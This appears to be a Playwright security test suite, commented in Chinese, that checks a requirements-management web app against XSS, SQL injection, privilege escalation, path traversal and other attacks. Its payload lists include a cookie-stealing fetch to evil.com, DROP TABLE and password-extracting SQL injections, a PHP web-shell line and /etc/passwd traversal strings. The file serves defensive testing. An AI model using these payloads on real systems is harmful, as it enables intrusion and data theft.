import { test, expect, Page } from '@playwright/test';
import { TestHelpers, RequirementTestHelpers } from './utils/test-helpers';

/**
 * 需求管理系统安全测试
 * 验证需求模块的安全机制和防护措施
 *
 * 测试覆盖:
 * 1. XSS防护 - 需求标题、描述、评论
 * 2. SQL注入防护 - 搜索、过滤、查询
 * 3. 权限验证 - RBAC、企业隔离
 * 4. 数据隔离 - 跨企业访问防护
 * 5. 输入验证 - 恶意输入处理
 */

test.describe('需求管理安全测试', () => {
  let helpers: TestHelpers;
  let requirementHelpers: RequirementTestHelpers;

  test.beforeEach(async ({ page }) => {
    helpers = new TestHelpers(page);
    requirementHelpers = new RequirementTestHelpers(page);

    // 管理员登录
    await page.goto('/login');
    await helpers.safeFill('[data-testid="username-input"]', 'admin');
    await helpers.safeFill('[data-testid="password-input"]', 'admin123');
    await helpers.safeClick('[data-testid="login-button"]');
    await helpers.verifyUrlContains('/dashboard');
  });

  test.describe('1. XSS防护测试', () => {

    test('1.1 需求标题中的XSS防护', async ({ page }) => {
      const xssPayloads = [
        '<script>alert("XSS in title")</script>',
        '<img src="x" onerror="alert(1)">',
        '"><script>alert("XSS")</script>',
        '<svg onload=alert(1)>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<?php system($_GET["cmd"]); ?>',
        '<svg><script>alert(1)</script></svg>'
      ];

      for (const payload of xssPayloads) {
        // 尝试创建包含XSS payload的需求
        await page.goto('/requirements');
        await helpers.waitForNetworkIdle();
        await helpers.safeClick('[data-testid="create-requirement-button"]');

        await helpers.safeFill('[data-testid="requirement-title-input"]', payload);
        await helpers.safeFill('[data-testid="requirement-description-input"]', 'Normal description');
        await helpers.safeClick('[data-testid="submit-create-requirement"]');

        await helpers.waitForNetworkIdle();

        // 监听alert对话框
        const dialogs: string[] = [];
        page.on('dialog', dialog => {
          dialogs.push(dialog.message());
          dialog.accept();
        });

        // 等待看是否有alert
        await page.waitForTimeout(1000);
        expect(dialogs.length).toBe(0);

        // 验证XSS payload被正确转义
        const displayedTitle = await page.locator('[data-testid="requirement-title"]').first().textContent();
        expect(displayedTitle).not.toContain('<script>');
        expect(displayedTitle).not.toContain('<img');
        expect(displayedTitle).not.toContain('onerror=');
        expect(displayedTitle).not.toContain('javascript:');
      }
    });

    test('1.2 需求描述中的XSS防护', async ({ page }) => {
      const xssPayloads = [
        '<script>document.cookie</script>',
        '<img src=x onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">',
        '<style>body{background-image:url("javascript:alert(1)")}</style>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<base href="javascript:alert(1)//">'
      ];

      for (const payload of xssPayloads) {
        const requirementId = await requirementHelpers.createRequirement(
          'XSS测试需求',
          payload,
          'medium'
        );

        await page.goto(`/requirements/${requirementId}`);
        await helpers.waitForNetworkIdle();

        // 验证XSS未被执行
        const description = await page.locator('[data-testid="requirement-description"]').textContent();
        expect(description).not.toContain('<script>');
        expect(description).not.toContain('onerror=');
        expect(description).not.toContain('javascript:');

        // 验证HTML标签被转义或移除
        const descriptionHTML = await page.locator('[data-testid="requirement-description"]').innerHTML();
        expect(descriptionHTML).not.toMatch(/<script[\s\S]*?<\/script>/i);
        expect(descriptionHTML).not.toMatch(/<img[^>]*onerror/i);
      }
    });

    test('1.3 评论中的XSS防护', async ({ page }) => {
      // 先创建一个需求
      const requirementId = await requirementHelpers.createRequirement(
        '评论XSS测试',
        '测试评论中的XSS防护',
        'low'
      );

      const xssComments = [
        '<script>alert("XSS in comment")</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(document.domain)</script>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      for (const xssPayload of xssComments) {
        await requirementHelpers.addComment(requirementId, xssPayload);

        // 验证脚本未执行
        await page.goto(`/requirements/${requirementId}`);
        await helpers.waitForNetworkIdle();

        const comments = await page.locator('[data-testid="comment-content"]').all();
        for (const comment of comments) {
          const content = await comment.textContent();
          expect(content).not.toContain('<script>');
          expect(content).not.toContain('onerror=');
        }
      }
    });

    test('1.4 @用户提及中的XSS防护', async ({ page }) => {
      const requirementId = await requirementHelpers.createRequirement(
        '@提及XSS测试',
        '测试@提及功能的XSS防护',
        'medium'
      );

      // 尝试在@提及中注入XSS
      await page.goto(`/requirements/${requirementId}`);
      await helpers.waitForNetworkIdle();

      const commentInput = await helpers.waitAndGet('[data-testid="comment-input"]');
      await commentInput.fill('@<script>alert(1)</script>');

      // 等待提及下拉框出现
      await page.waitForTimeout(1000);

      // 验证没有alert被触发
      const dialogs: string[] = [];
      page.on('dialog', dialog => {
        dialogs.push(dialog.message());
        dialog.accept();
      });

      await page.waitForTimeout(1000);
      expect(dialogs.length).toBe(0);
    });
  });

  test.describe('2. SQL注入防护测试', () => {

    test('2.1 需求搜索中的SQL注入防护', async ({ page, request }) => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE requirements; --",
        "1' UNION SELECT null,null,null,null--",
        "admin'--",
        "' OR 1=1--",
        "' OR 'a'='a",
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "1' WAITFOR DELAY '00:00:05'--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "1' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request.get('/api/v1/requirements/search', {
          params: { q: payload }
        });

        // 验证请求被安全处理
        expect(response.status()).toBeLessThan(500);

        if (response.ok()) {
          const data = await response.json();

          // 验证不返回敏感数据
          expect(JSON.stringify(data)).not.toMatch(/password|secret|token|@@version/i);

          // 验证不泄露数据库结构信息
          expect(JSON.stringify(data)).not.toMatch(/information_schema|table_name|column_name/i);
        }
      }
    });

    test('2.2 需求过滤中的SQL注入防护', async ({ page, request }) => {
      const maliciousFilters = [
        { status: "' OR '1'='1" },
        { priority: "'; DROP TABLE requirements; --" },
        { assignee_id: "1 UNION SELECT * FROM users--" },
        { enterprise_id: "1' AND 1=1--" }
      ];

      for (const filter of maliciousFilters) {
        const response = await request.get('/api/v1/requirements', {
          params: filter
        });

        expect(response.status()).toBeLessThan(500);

        if (response.ok()) {
          const data = await response.json();
          expect(JSON.stringify(data)).not.toMatch(/password|jwt_secret|private_key/i);
        }
      }
    });

    test('2.3 需求ID参数中的SQL注入防护', async ({ request }) => {
      const maliciousIds = [
        "1' OR '1'='1",
        "1; DROP TABLE requirements;",
        "1 UNION SELECT password FROM users WHERE id=1--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--"
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request.get(`/api/v1/requirements/${maliciousId}`);

        // 应该返回错误或空结果,而不是服务器错误
        expect(response.status()).not.toBe(500);

        // 如果返回200,验证数据安全
        if (response.ok()) {
          const data = await response.json();
          expect(JSON.stringify(data)).not.toMatch(/password|secret|token/i);
        }
      }
    });
  });

  test.describe('3. 权限验证测试', () => {

    test('3.1 未授权用户无法创建需求', async ({ browser }) => {
      // 创建新的浏览器上下文,模拟未授权用户
      const context = await browser.newContext();
      const page = await context.newPage();

      try {
        // 尝试直接访问创建需求页面(未登录)
        const response = await page.goto('/requirements/new');

        // 应该被重定向到登录页
        await page.waitForURL('**/login**', { timeout: 5000 });
        expect(page.url()).toContain('/login');

        // 尝试直接调用API(无token)
        const apiResponse = await page.request.post('/api/v1/requirements', {
          data: {
            title: '未授权创建测试',
            description: '测试',
            priority: 'medium'
          }
        });

        expect([401, 403]).toContain(apiResponse.status());
      } finally {
        await context.close();
      }
    });

    test('3.2 跨企业访问防护', async ({ browser, request }) => {
      // 测试企业A的用户无法访问企业B的需求

      // 假设企业1和企业2的需求
      const enterprise1RequirementId = 1;
      const enterprise2RequirementId = 100;

      // 获取企业1用户的token
      const loginResponse = await request.post('/api/v1/auth/login', {
        data: {
          username: 'enterprise1_user',
          password: 'password123'
        }
      });

      if (loginResponse.ok()) {
        const loginData = await loginResponse.json();
        const token = loginData.data?.token;

        if (token) {
          // 尝试访问另一个企业的需求
          const response = await request.get(`/api/v1/requirements/${enterprise2RequirementId}`, {
            headers: {
              'Authorization': `Bearer ${token}`
            }
          });

          // 应该返回403或404,而不是返回数据
          expect([403, 404]).toContain(response.status());
        }
      }
    });

    test('3.3 普通用户无法审批需求', async ({ browser }) => {
      // 创建普通用户上下文
      const context = await browser.newContext();
      const page = await context.newPage();

      try {
        // 普通用户登录
        await page.goto('/login');
        await page.fill('[data-testid="username-input"]', 'regular_user');
        await page.fill('[data-testid="password-input"]', 'password123');
        await page.click('[data-testid="login-button"]');

        // 尝试访问审批按钮
        await page.goto('/requirements/1');
        await helpers.waitForNetworkIdle();

        // 审批按钮应该不可见或禁用
        const approveButton = page.locator('[data-testid="approve-requirement-button"]');
        if (await approveButton.isVisible()) {
          expect(await approveButton.isDisabled()).toBe(true);
        }

        // 尝试直接调用审批API
        const response = await page.request.post('/api/v1/requirements/1/approve', {
          data: { comment: '尝试审批' }
        });

        expect(response.status()).toBe(403);
      } finally {
        await context.close();
      }
    });

    test('3.4 权限提升攻击防护', async ({ request }) => {
      // 尝试通过修改请求参数提升权限

      // 普通用户登录
      const loginResponse = await request.post('/api/v1/auth/login', {
        data: {
          username: 'regular_user',
          password: 'password123'
        }
      });

      if (loginResponse.ok()) {
        const loginData = await loginResponse.json();
        const token = loginData.data?.token;

        if (token) {
          // 尝试在创建需求时指定管理员权限
          const maliciousPayloads = [
            { title: 'Test', role: 'admin', is_admin: true },
            { title: 'Test', user_type: 'system', permissions: ['*'] },
            { title: 'Test', enterprise_id: null }, // 尝试创建系统级需求
            { title: 'Test', created_by: 1 } // 尝试伪造创建者
          ];

          for (const payload of maliciousPayloads) {
            const response = await request.post('/api/v1/requirements', {
              data: payload,
              headers: {
                'Authorization': `Bearer ${token}`
              }
            });

            if (response.ok()) {
              const data = await response.json();

              // 验证恶意字段被忽略
              expect(data.data?.role).not.toBe('admin');
              expect(data.data?.is_admin).not.toBe(true);
              expect(data.data?.user_type).not.toBe('system');
            }
          }
        }
      }
    });

    test('3.5 批量操作权限验证', async ({ page }) => {
      // 测试批量删除、批量审批等操作的权限验证
      await page.goto('/requirements');
      await helpers.waitForNetworkIdle();

      // 选择多个需求
      const checkboxes = await page.locator('[data-testid^="requirement-checkbox-"]').all();
      for (let i = 0; i < Math.min(3, checkboxes.length); i++) {
        await checkboxes[i].check();
      }

      // 普通用户不应该看到批量删除按钮
      const batchDeleteButton = page.locator('[data-testid="batch-delete-button"]');

      if (await batchDeleteButton.isVisible()) {
        // 如果按钮可见,应该是禁用的
        expect(await batchDeleteButton.isDisabled()).toBe(true);
      }
    });
  });

  test.describe('4. 输入验证和数据完整性', () => {

    test('4.1 超长输入处理', async ({ page }) => {
      const longTitle = 'A'.repeat(10000); // 10000字符
      const longDescription = 'B'.repeat(100000); // 100000字符

      await page.goto('/requirements');
      await helpers.safeClick('[data-testid="create-requirement-button"]');

      await helpers.safeFill('[data-testid="requirement-title-input"]', longTitle);
      await helpers.safeFill('[data-testid="requirement-description-input"]', longDescription);
      await helpers.safeClick('[data-testid="submit-create-requirement"]');

      await helpers.waitForNetworkIdle();

      // 验证显示错误提示或自动截断
      const errorMessage = await page.locator('[data-testid="error-message"]').textContent();
      if (errorMessage) {
        expect(errorMessage).toMatch(/长度|字符|超出限制/i);
      } else {
        // 如果没有错误,验证数据被截断
        const displayedTitle = await page.locator('[data-testid="requirement-title"]').first().textContent();
        expect(displayedTitle?.length || 0).toBeLessThan(1000);
      }
    });

    test('4.2 特殊字符处理', async ({ page }) => {
      const specialChars = [
        '🚀💻🎉😀',  // Emoji
        '中文测试',
        'Тест',      // Cyrillic
        '🔥\u0000\u0001', // Null bytes
        '\\n\\r\\t',  // Control characters
        '"\'\\/',     // Quotes and slashes
        '<>&',        // HTML entities
      ];

      for (const chars of specialChars) {
        const requirementId = await requirementHelpers.createRequirement(
          `特殊字符测试: ${chars}`,
          `描述: ${chars}`,
          'low'
        );

        await page.goto(`/requirements/${requirementId}`);
        await helpers.waitForNetworkIdle();

        // 验证特殊字符被正确处理
        const title = await page.locator('[data-testid="requirement-title"]').textContent();
        expect(title).toContain(chars.replace(/[\u0000-\u001F]/g, '')); // 控制字符应被移除
      }
    });

    test('4.3 必填字段验证', async ({ page }) => {
      await page.goto('/requirements');
      await helpers.safeClick('[data-testid="create-requirement-button"]');

      // 不填写任何字段,直接提交
      await helpers.safeClick('[data-testid="submit-create-requirement"]');

      // 验证显示错误提示
      const titleError = await page.locator('[data-testid="title-error"]').isVisible();
      const descriptionError = await page.locator('[data-testid="description-error"]').isVisible();

      expect(titleError || descriptionError).toBe(true);
    });

    test('4.4 数据类型验证', async ({ request }) => {
      const invalidPayloads = [
        { title: 123, description: 'test' },  // 标题应该是字符串
        { title: 'test', priority: 'invalid' }, // 无效的优先级
        { title: 'test', status: 999 },       // 无效的状态
        { title: null, description: null }    // Null值
      ];

      for (const payload of invalidPayloads) {
        const response = await request.post('/api/v1/requirements', {
          data: payload
        });

        // 应该返回400错误
        expect([400, 422]).toContain(response.status());
      }
    });
  });

  test.describe('5. 会话和认证安全', () => {

    test('5.1 Token过期处理', async ({ browser, request }) => {
      // 使用过期token访问需求
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDAwMDAwMDB9.invalid';

      const response = await request.get('/api/v1/requirements', {
        headers: {
          'Authorization': `Bearer ${expiredToken}`
        }
      });

      expect(response.status()).toBe(401);

      const data = await response.json();
      expect(data.message).toMatch(/token|过期|expired/i);
    });

    test('5.2 CSRF Token验证', async ({ page, request }) => {
      // 尝试不带CSRF token发送状态改变请求
      const response = await request.post('/api/v1/requirements/1/approve', {
        data: { comment: 'CSRF测试' },
        headers: {
          'Content-Type': 'application/json'
          // 故意不包含CSRF token
        }
      });

      // 应该被拒绝
      expect([403, 401]).toContain(response.status());
    });

    test('5.3 并发会话安全', async ({ browser }) => {
      // 同一用户在不同浏览器上下文中登录
      const context1 = await browser.newContext();
      const context2 = await browser.newContext();

      const page1 = await context1.newPage();
      const page2 = await context2.newPage();

      try {
        // 两个会话都用相同账号登录
        for (const page of [page1, page2]) {
          await page.goto('/login');
          await page.fill('[data-testid="username-input"]', 'admin');
          await page.fill('[data-testid="password-input"]', 'admin123');
          await page.click('[data-testid="login-button"]');
          await page.waitForURL('**/dashboard**');
        }

        // 在会话1中创建需求
        await page1.goto('/requirements');
        const requirementId = await requirementHelpers.createRequirement(
          '并发会话测试',
          '测试并发会话安全',
          'medium'
        );

        // 在会话2中也能看到这个需求
        await page2.goto(`/requirements/${requirementId}`);
        await helpers.waitForNetworkIdle();

        const title = await page2.locator('[data-testid="requirement-title"]').textContent();
        expect(title).toContain('并发会话测试');

        // 在会话1中登出
        await page1.goto('/logout');

        // 会话2应该仍然有效
        await page2.reload();
        const stillLoggedIn = await page2.locator('[data-testid="user-profile"]').isVisible();
        expect(stillLoggedIn).toBe(true);
      } finally {
        await context1.close();
        await context2.close();
      }
    });
  });

  test.describe('6. 文件和附件安全', () => {

    test('6.1 恶意文件上传防护', async ({ page }) => {
      // 如果需求支持附件上传
      const maliciousFiles = [
        { name: 'malware.exe', type: 'application/x-msdownload' },
        { name: 'script.php', type: 'application/x-php' },
        { name: 'shell.sh', type: 'application/x-sh' },
        { name: '../../../etc/passwd', type: 'text/plain' }, // 路径遍历
        { name: 'file.jsp', type: 'application/x-jsp' }
      ];

      for (const file of maliciousFiles) {
        const buffer = Buffer.from('malicious content');

        try {
          const response = await page.request.post('/api/v1/requirements/1/attachments', {
            multipart: {
              file: {
                name: file.name,
                mimeType: file.type,
                buffer: buffer
              }
            }
          });

          // 恶意文件应该被拒绝
          if (response.ok()) {
            const data = await response.json();
            expect(data.success).toBe(false);
          } else {
            expect([400, 403, 415]).toContain(response.status());
          }
        } catch (error) {
          // 端点可能不存在,这是可以接受的
          console.log(`文件上传端点不存在或被正确阻止: ${file.name}`);
        }
      }
    });

    test('6.2 文件路径遍历防护', async ({ request }) => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file:///etc/passwd',
        '/var/www/html/../../../etc/passwd'
      ];

      for (const path of pathTraversalAttempts) {
        const response = await request.get(`/api/v1/attachments/${encodeURIComponent(path)}`);

        // 应该返回错误,而不是文件内容
        expect([400, 403, 404]).toContain(response.status());
      }
    });
  });

  test.describe('7. 信息泄露防护', () => {

    test('7.1 错误消息不泄露敏感信息', async ({ request }) => {
      // 尝试访问不存在的需求
      const response = await request.get('/api/v1/requirements/999999');

      const responseText = await response.text();

      // 错误消息不应包含数据库信息、文件路径等
      expect(responseText).not.toMatch(/SELECT.*FROM/i);
      expect(responseText).not.toMatch(/\/home\/.*\/|C:\\.*\\/);
      expect(responseText).not.toMatch(/stack trace/i);
      expect(responseText).not.toMatch(/password|secret|key|token/i);
    });

    test('7.2 API响应不包含敏感字段', async ({ request }) => {
      const response = await request.get('/api/v1/requirements/1');

      if (response.ok()) {
        const data = await response.json();
        const dataStr = JSON.stringify(data);

        // 验证不包含敏感字段
        expect(dataStr).not.toMatch(/password|jwt_secret|private_key|api_key/i);
        expect(dataStr).not.toMatch(/creditcard|ssn|tax_id/i);
      }
    });

    test('7.3 用户枚举防护', async ({ request }) => {
      // 尝试枚举用户
      const usernames = ['admin', 'user1', 'nonexistent', 'test'];
      const responseTimes: number[] = [];

      for (const username of usernames) {
        const start = Date.now();
        const response = await request.post('/api/v1/auth/login', {
          data: {
            username: username,
            password: 'wrongpassword'
          }
        });
        const responseTime = Date.now() - start;
        responseTimes.push(responseTime);

        // 所有失败的登录应该返回相同的错误消息
        expect(response.status()).toBe(401);
      }

      // 验证响应时间相近(防止时间攻击)
      const avgTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
      responseTimes.forEach(time => {
        expect(Math.abs(time - avgTime)).toBeLessThan(100); // 100ms内
      });
    });
  });

  test.describe('8. API安全头部', () => {

    test('8.1 安全响应头验证', async ({ request }) => {
      const response = await request.get('/api/v1/requirements');
      const headers = response.headers();

      // 验证关键安全头部存在
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-frame-options']).toBeDefined();
      expect(headers['x-xss-protection']).toBeDefined();

      // 验证不暴露服务器信息
      const serverHeader = headers['server'];
      if (serverHeader) {
        expect(serverHeader).not.toMatch(/nginx\/[\d.]+|apache\/[\d.]+/i);
      }
    });

    test('8.2 CORS策略验证', async ({ request }) => {
      const response = await request.get('/api/v1/requirements', {
        headers: {
          'Origin': 'https://evil.com'
        }
      });

      const corsHeader = response.headers()['access-control-allow-origin'];

      // 不应该允许任意来源
      expect(corsHeader).not.toBe('*');

      // 如果允许CORS,应该是白名单中的域名
      if (corsHeader) {
        expect(['http://localhost:3000', 'https://yourdomain.com']).toContain(corsHeader);
      }
    });
  });

  test.describe('9. 速率限制', () => {

    test('9.1 API调用速率限制', async ({ request }) => {
      const requests = [];

      // 快速发送大量请求
      for (let i = 0; i < 100; i++) {
        requests.push(
          request.get('/api/v1/requirements')
        );
      }

      const responses = await Promise.all(requests);

      // 应该有一些请求被限流
      const rateLimitedCount = responses.filter(r => r.status() === 429).length;

      // 至少应该有部分请求被限流
      expect(rateLimitedCount).toBeGreaterThan(0);

      console.log(`${rateLimitedCount}/100 请求被限流`);
    });

    test('9.2 登录尝试速率限制', async ({ request }) => {
      const attempts = [];

      for (let i = 0; i < 10; i++) {
        attempts.push(
          request.post('/api/v1/auth/login', {
            data: {
              username: 'testuser',
              password: 'wrongpassword'
            }
          })
        );
      }

      const responses = await Promise.all(attempts);

      // 应该触发登录限流
      const rateLimited = responses.some(r => r.status() === 429);
      expect(rateLimited).toBe(true);
    });
  });
});
